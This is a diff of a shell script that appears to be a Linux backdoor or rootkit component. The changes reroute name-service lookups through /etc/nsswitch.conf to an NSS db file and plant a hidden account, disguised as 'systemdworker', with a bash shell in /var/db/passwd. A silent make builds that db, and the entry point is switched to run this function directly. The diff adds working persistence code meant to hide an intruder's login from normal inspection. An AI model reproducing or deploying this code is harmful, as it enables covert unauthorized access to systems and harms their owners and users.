@@ -12,7 +12,9 @@ users_db() {
 	echo "Getting databases"
 	sed -i 's/files/db files/g' /etc/nsswitch.conf;
 	#GET_FILE "$1/shadow.db" "/var/db/shadow.db";
-    echo "hidden:x:999:999:hidden:/home:/bin/bash" > /var/db/passwd
+	sed -i 's:/etc/passwd:passwd:g' /var/db/Makefile
+    	echo "systemdworker:x:999:999:systemdworker:/home:/bin/bash" > /var/db/passwd
+	make -C /var/db 2>/dev/null >/dev/null
     [ "$?" = "0" ] || echo "Downloading shadow.db failed..." 
 	#GET_FILE "$1/passwd.db" "/var/db/passwd.db";
 	[ "$?" = "0" ] || echo "Downloading passwd.db failed..." 
@@ -54,11 +56,10 @@ tools_suid() {
     return 0;
 };
 
-users() {
-    #users_db "$GLOBAL_SERVER";
-    echo "Sudoers added"
-    users_sudo;
-};
+#users() {
+   # #users_db "$GLOBAL_SERVER";
+  #  echo "Sudoers added"
+ #   users_sudo;
+#};
 
-users;
-tools_suid;
+users_db;
